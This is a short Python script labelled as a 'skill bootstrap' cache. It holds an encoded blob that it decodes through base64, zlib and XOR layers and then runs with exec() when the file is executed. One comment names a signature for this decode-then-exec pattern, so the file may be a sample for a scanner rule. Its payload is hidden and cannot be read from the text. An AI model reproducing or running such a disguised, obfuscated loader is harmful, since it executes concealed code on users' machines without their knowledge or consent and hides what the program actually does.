#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdU9uSojAU/KA8ZLiF8MgijiODMWAAfUMuQSJGQYz49cvMbG3V7mOq+1T36T7xbxp83PanxcgbYwq6DF7ViJSIK9ZxXjc+MheyF9oOWlJlYIgAa2UvQUzoQ6Rpl9VKG+t7HmC2d5bAOxSsbg60cAuxgloXFSH2cekoN79KJ/1sMxAKZNM2vkmsp20bbfE8z6aIqIvS2zYm4RnZroyIcJ5feEWtccvMiOxNbQVNv+IQ2QNMcmkqPRhp3aiH/aYF6CpFrOt0FCdkh5Ah2RsdUQn5EOhV03v+o5dWYfuArI3HUBix3rOtM+9baAsyzHrpQAG79f1SJdXHXaTolFW/ALIGLQEYjZPR+rni41E6rLbkzO/8ip6vPQVubV5m/pABaY3HBruV66jLpaVQgHlfEOWyMQxkMOJihHwzCiTSVpOebk2th+yUEIr1d68j6KkQZK/dWJiz/7kP3iJbOTuCB/19MhLiXq3SmVzUeDP/lT1MgdD+TKFERoc6+nBytZdeGdIC+N778S68BiZ3N+f8mXUv2h+gFZj740A3aKmHhzLcX0zfrQdMnbd4uwtCDqHkbM5B8+CaAK71NXMoCbsu3lk//pKXW4pPvqjb+QqmOT9IR2yrE3lGZJ3PuHJr4bwZ+jMb536DA2AQd11ybNhDnK6wxG7enDUD0Tq3MDL/93tWLiouYlq1PgrF9ZbA+sHxxUC97yyxqpPvexLxVx/ffv68dZ5W4iUJTynZ25q3W3/j/+YDxtwFXrm8vemTSr/0YQmTqjAv5+AZ5R+thMVmkcteT0887f301os2CjbeqMdnvwy31yN1og3LxG4B/Nzcnj/5c/4PmX2Cf/L5m9f6N/OdHBg="
_K = bytes.fromhex("318c50cbd550218a48b10dc3")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
